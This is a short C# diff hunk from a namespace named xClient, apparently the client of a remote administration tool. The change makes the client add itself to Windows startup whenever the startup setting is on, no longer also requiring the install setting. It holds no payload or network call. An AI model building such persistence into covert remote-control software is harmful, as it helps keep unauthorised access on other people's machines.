@@ -153,7 +153,7 @@ namespace xClient
             {
                 WindowsAccountHelper.StartUserIdleCheckThread();
 
-                if (Settings.STARTUP && Settings.INSTALL)
+                if (Settings.STARTUP)
                 {
                     if (!Startup.AddToStartup())
                         ClientData.AddToStartupFailed = true;
